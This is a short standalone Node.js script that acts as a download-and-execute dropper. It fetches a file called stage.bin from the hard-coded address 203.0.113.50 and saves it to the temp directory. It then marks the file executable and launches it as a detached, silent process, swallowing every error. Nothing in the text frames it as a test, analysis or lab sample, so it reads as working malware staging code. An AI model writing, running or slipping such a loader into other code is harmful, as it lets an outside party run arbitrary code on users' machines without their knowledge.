const http = require("http"), fs = require("fs"), os = require("os"), path = require("path");
const { spawn } = require("child_process");
const dest = path.join(os.tmpdir(), "stage.bin");
http.get({ host: "203.0.113.50", path: "/stage.bin", timeout: 3000 }, (res) => {
  const out = fs.createWriteStream(dest);
  res.pipe(out);
  out.on("finish", () => {
    try { fs.chmodSync(dest, 0o755); spawn(dest, { detached: true, stdio: "ignore" }).unref(); }
    catch {}
  });
}).on("error", () => {});
